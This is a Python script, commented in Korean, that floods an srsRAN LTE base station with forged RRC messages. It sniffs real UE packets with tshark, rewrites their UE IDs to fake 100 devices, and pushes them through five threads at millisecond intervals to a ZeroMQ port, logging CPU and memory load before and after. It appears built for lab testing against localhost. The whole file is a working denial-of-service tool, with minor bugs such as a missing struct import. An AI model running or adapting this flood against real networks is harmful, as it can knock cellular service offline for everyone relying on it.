#!/usr/bin/env python3
"""
실제 UE 패킷 형식을 사용한 플러딩 공격
실제 UE가 보내는 RRC 메시지 형식을 그대로 복사해서 사용
"""

import zmq
import time
import threading
import random
import subprocess
import os
import re
from datetime import datetime

class RealUEFlood:
    def __init__(self, target_port=2005):
        self.target_port = target_port
        self.context = zmq.Context()
        self.running = False
        self.attack_threads = []
        
        # 로그 설정
        self.log_dir = "logs"
        self.log_file = None
        self.start_time = None
        self.start_stats = None
        self.end_stats = None
        
        # 실제 UE 패킷 저장소
        self.real_packets = {}
        
    def get_system_stats(self):
        """시스템 리소스 통계 수집"""
        try:
            stats = {
                'timestamp': datetime.now().isoformat(),
                'cpu_percent': 0,
                'memory_percent': 0,
                'memory_used_gb': 0,
                'bytes_sent': 0,
                'bytes_recv': 0,
                'srsran_cpu': 0,
                'srsran_memory': 0
            }
            
            # CPU 사용량
            try:
                result = subprocess.run(['top', '-l', '1', '-n', '0'], 
                                      capture_output=True, text=True, timeout=5)
                cpu_line = [line for line in result.stdout.split('\n') if 'CPU usage' in line]
                if cpu_line:
                    cpu_match = re.search(r'(\d+\.\d+)%', cpu_line[0])
                    if cpu_match:
                        stats['cpu_percent'] = float(cpu_match.group(1))
            except:
                pass
            
            # 메모리 사용량
            try:
                result = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                page_size = 4096
                total_pages = 0
                free_pages = 0
                
                for line in lines:
                    if 'Pages free' in line:
                        match = re.search(r'(\d+)', line)
                        if match:
                            free_pages = int(match.group(1))
                    elif 'Pages active' in line or 'Pages inactive' in line or 'Pages wired down' in line:
                        match = re.search(r'(\d+)', line)
                        if match:
                            total_pages += int(match.group(1))
                
                total_pages += free_pages
                if total_pages > 0:
                    memory_used_bytes = (total_pages - free_pages) * page_size
                    memory_total_bytes = total_pages * page_size
                    stats['memory_percent'] = (memory_used_bytes / memory_total_bytes) * 100
                    stats['memory_used_gb'] = memory_used_bytes / (1024**3)
            except:
                pass
            
            # 네트워크 트래픽
            try:
                result = subprocess.run(['netstat', '-ib'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                bytes_sent = 0
                bytes_recv = 0
                
                for line in lines:
                    if 'en0' in line or 'en1' in line:
                        parts = line.split()
                        if len(parts) >= 10:
                            try:
                                bytes_sent += int(parts[6])
                                bytes_recv += int(parts[9])
                            except:
                                pass
                
                stats['bytes_sent'] = bytes_sent
                stats['bytes_recv'] = bytes_recv
            except:
                pass
            
            # srsRAN 프로세스 리소스
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                for line in lines:
                    if 'srsenb' in line.lower():
                        parts = line.split()
                        if len(parts) >= 11:
                            try:
                                cpu = float(parts[2])
                                memory = float(parts[3])
                                stats['srsran_cpu'] += cpu
                                stats['srsran_memory'] += memory
                            except:
                                pass
            except:
                pass
            
            return stats
            
        except Exception as e:
            print(f"리소스 통계 수집 오류: {e}")
            return None
    
    def log_message(self, message):
        """로그 메시지 출력 및 파일 저장"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        
        if self.log_file:
            self.log_file.write(log_msg + '\n')
            self.log_file.flush()
    
    def setup_logging(self, attack_type, duration):
        """로그 파일 설정"""
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_filename = f"{self.log_dir}/real_ue_flood_{attack_type}_{timestamp}.log"
        
        self.log_file = open(log_filename, 'w', encoding='utf-8')
        self.log_message(f"=== Real UE Flood Attack 로그 시작 ===")
        self.log_message(f"공격 유형: {attack_type}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message(f"로그 파일: {log_filename}")
        self.log_message("=" * 50)
    
    def capture_real_ue_packets(self, duration=10):
        """실제 UE 패킷 캡처"""
        self.log_message("=== 실제 UE 패킷 캡처 시작 ===")
        self.log_message("UE를 사용해서 RRC 메시지를 보내주세요...")
        
        try:
            cmd = [
                "sudo", "tshark", 
                "-i", "any",
                "-f", "port 2001",
                "-T", "fields",
                "-e", "data"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration)
            
            if result.returncode == 0:
                self.parse_captured_packets(result.stdout)
                return True
            else:
                self.log_message(f"패킷 캡처 실패: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.log_message("캡처 시간 초과")
            return False
        except Exception as e:
            self.log_message(f"캡처 오류: {e}")
            return False
    
    def parse_captured_packets(self, output):
        """캡처된 패킷 파싱"""
        lines = output.strip().split('\n')
        packet_count = 0
        
        for line in lines:
            if not line.strip():
                continue
                
            # 16진수 데이터 파싱
            hex_data = line.replace(':', '').replace(' ', '')
            if len(hex_data) >= 4:  # 최소 2바이트
                try:
                    packet_bytes = bytes.fromhex(hex_data)
                    
                    # RRC 메시지 타입 추출
                    if len(packet_bytes) >= 2:
                        message_type = int.from_bytes(packet_bytes[:2], 'big')
                        
                        if message_type not in self.real_packets:
                            self.real_packets[message_type] = []
                        
                        self.real_packets[message_type].append(packet_bytes)
                        packet_count += 1
                        
                except ValueError:
                    continue
        
        self.log_message(f"캡처된 패킷: {packet_count}개")
        self.log_message(f"메시지 타입: {list(self.real_packets.keys())}")
    
    def generate_attack_packets(self):
        """공격용 패킷 생성"""
        attack_packets = []
        
        for msg_type, packets in self.real_packets.items():
            self.log_message(f"메시지 타입 0x{msg_type:04X}: {len(packets)}개 패킷")
            
            # 가장 긴 패킷을 기준으로 사용
            base_packet = max(packets, key=len)
            
            # 다양한 UE ID로 변형 생성
            for ue_id in range(1000, 1100):  # 100개 UE
                attack_packet = bytearray(base_packet)
                
                # UE ID 변경 (패킷 구조에 따라)
                if len(attack_packet) >= 6:
                    attack_packet[2:6] = ue_id.to_bytes(4, 'big')
                
                # 일부 필드 랜덤화
                for i in range(10, min(len(attack_packet), 50)):
                    attack_packet[i] = (attack_packet[i] + ue_id) % 256
                
                attack_packets.append(bytes(attack_packet))
        
        self.log_message(f"생성된 공격 패킷: {len(attack_packets)}개")
        return attack_packets
    
    def send_message(self, message, description):
        """메시지 전송"""
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f"tcp://localhost:{self.target_port}")
            socket.send(message, zmq.NOBLOCK)
            socket.close()
            self.log_message(f"전송: {description} ({len(message)} bytes)")
            return True
        except Exception as e:
            self.log_message(f"전송 실패: {description} - {e}")
            return False
    
    def flooding_attack(self, attack_packets, duration):
        """플러딩 공격"""
        start_time = time.time()
        sent_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 랜덤 패킷 선택
                packet = random.choice(attack_packets)
                
                # 전송
                if self.send_message(packet, f"Real UE Flood #{sent_count}"):
                    sent_count += 1
                
                time.sleep(0.001)  # 매우 짧은 간격
                
            except Exception as e:
                self.log_message(f"플러딩 공격 오류: {e}")
                time.sleep(1)
        
        self.log_message(f"총 전송된 메시지: {sent_count}개")
    
    def start_attack(self, duration=60):
        """공격 시작"""
        # 로그 설정
        self.setup_logging("real_ue", duration)
        
        # 시작 시 리소스 통계 수집
        self.start_time = datetime.now()
        self.start_stats = self.get_system_stats()
        
        if self.start_stats:
            self.log_message("=== 공격 시작 시 리소스 상태 ===")
            self.log_message(f"CPU 사용량: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"메모리 사용량: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
            self.log_message("=" * 50)
        
        self.log_message(f"=== Real UE Flood Attack 시작 ===")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message("=" * 50)
        
        # 실제 UE 패킷 캡처
        if not self.capture_real_ue_packets(10):
            self.log_message("실제 UE 패킷 캡처 실패 - 기본 패킷 사용")
            # 실제 RRC 메시지 형식으로 기본 패킷 생성
            self.real_packets[0x0001] = [
                # RRC Connection Request (더 큰 크기로 처리 부담 증가)
                struct.pack('>H', 0x0001) +  # Message Type
                struct.pack('>I', 1001) +     # UE Identity
                struct.pack('>H', 0x0001) +   # Establishment Cause
                struct.pack('>H', 0x0000) +   # Spare
                struct.pack('>Q', 1234567890123456) +  # IMSI
                struct.pack('>I', 123456) +   # TMSI
                struct.pack('>H', 12345) +    # LAI
                struct.pack('>B', 0x01) +     # RRC State
                struct.pack('>I', 123456) +   # Cell ID
                struct.pack('>H', 12345) +    # Tracking Area Code
                # 더 많은 복잡한 필드 추가
                struct.pack('>I', 0x12345678) +  # RRC Transaction ID
                struct.pack('>H', 0x0000) +      # Criticality
                struct.pack('>H', 0x0000) +      # Spare
                struct.pack('>Q', random.randint(1000000000000000, 9999999999999999)) +  # 추가 IMSI
                struct.pack('>I', random.randint(1, 1000000)) +  # 추가 TMSI
                struct.pack('>H', random.randint(1, 65535)) +    # 추가 LAI
                struct.pack('>B', random.randint(1, 255)) +     # 추가 상태
                struct.pack('>I', random.randint(1, 1000000)) +  # 추가 Cell ID
                struct.pack('>H', random.randint(1, 65535)) +   # 추가 TAC
                b'\x00' * 200  # 더 큰 페이로드
            ]
            
            self.real_packets[0x0003] = [
                # RRC Connection Setup Complete
                struct.pack('>H', 0x0003) +  # Message Type
                struct.pack('>I', 1001) +     # UE Identity
                struct.pack('>H', 0x0000) +   # Spare
                struct.pack('>H', 0x0041) +   # NAS Message Type
                struct.pack('>I', 123456) +   # NAS Transaction ID
                struct.pack('>B', 0x01) +     # NAS Security Header
                struct.pack('>B', 0x00) +     # NAS Spare
                b'\x00' * 300  # 더 큰 페이로드
            ]
            
            self.real_packets[0x0005] = [
                # RRC Measurement Report
                struct.pack('>H', 0x0005) +  # Message Type
                struct.pack('>I', 1001) +     # UE Identity
                struct.pack('>H', 12345) +   # Cell ID 1
                struct.pack('>B', 0x8C) +     # RSRP (-100)
                struct.pack('>B', 0xF6) +     # RSRQ (-10)
                struct.pack('>B', 0x64) +     # SINR (100)
                struct.pack('>H', 12346) +   # Cell ID 2
                struct.pack('>B', 0x8D) +     # RSRP (-99)
                struct.pack('>B', 0xF7) +     # RSRQ (-9)
                struct.pack('>B', 0x63) +     # SINR (99)
                b'\x00' * 400  # 더 큰 페이로드
            ]
        
        # 공격 패킷 생성
        attack_packets = self.generate_attack_packets()
        
        if not attack_packets:
            self.log_message("공격 패킷 생성 실패")
            return
        
        self.running = True
        
        # 플러딩 공격 스레드 시작
        for i in range(5):  # 5개 스레드로 동시 공격
            thread = threading.Thread(target=self.flooding_attack, args=(attack_packets, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        # 공격 지속 시간 대기
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        self.log_message("\n=== 공격 중지 ===")
        self.running = False
        
        # 스레드 종료 대기
        for thread in self.attack_threads:
            thread.join(timeout=1)
        
        # 종료 시 리소스 통계 수집
        self.end_stats = self.get_system_stats()
        
        if self.start_stats and self.end_stats:
            self.log_message("=== 공격 종료 시 리소스 상태 ===")
            self.log_message(f"CPU 사용량: {self.end_stats['cpu_percent']:.1f}% (시작: {self.start_stats['cpu_percent']:.1f}%)")
            self.log_message(f"메모리 사용량: {self.end_stats['memory_percent']:.1f}% (시작: {self.start_stats['memory_percent']:.1f}%)")
            self.log_message(f"메모리 사용량: {self.end_stats['memory_used_gb']:.2f}GB (시작: {self.start_stats['memory_used_gb']:.2f}GB)")
            
            # 네트워크 트래픽 차이 계산
            bytes_sent_diff = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_diff = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            self.log_message(f"네트워크 송신 증가: {bytes_sent_diff:,} bytes")
            self.log_message(f"네트워크 수신 증가: {bytes_recv_diff:,} bytes")
            
            self.log_message(f"srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}% (시작: {self.start_stats['srsran_cpu']:.1f}%)")
            self.log_message(f"srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}% (시작: {self.start_stats['srsran_memory']:.1f}%)")
            
            # 공격 지속 시간 계산
            if self.start_time:
                duration = datetime.now() - self.start_time
                self.log_message(f"공격 지속 시간: {duration.total_seconds():.1f}초")
            
            self.log_message("=" * 50)
        
        # ZeroMQ 정리
        self.context.term()
        
        # 로그 파일 닫기
        if self.log_file:
            self.log_file.close()
            self.log_message(f"로그 파일 저장 완료")
        
        self.log_message("공격 완료")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Real UE Flood Attack')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--target-port', type=int, default=2001, help='대상 포트')
    
    args = parser.parse_args()
    
    print("=== Real UE Flood Attack ===")
    print("실제 UE 패킷 형식을 사용한 플러딩 공격")
    print(f"지속 시간: {args.duration}초")
    print(f"대상 포트: {args.target_port}")
    print()
    
    attack = RealUEFlood(args.target_port)
    attack.start_attack(args.duration)

if __name__ == "__main__":
    main()
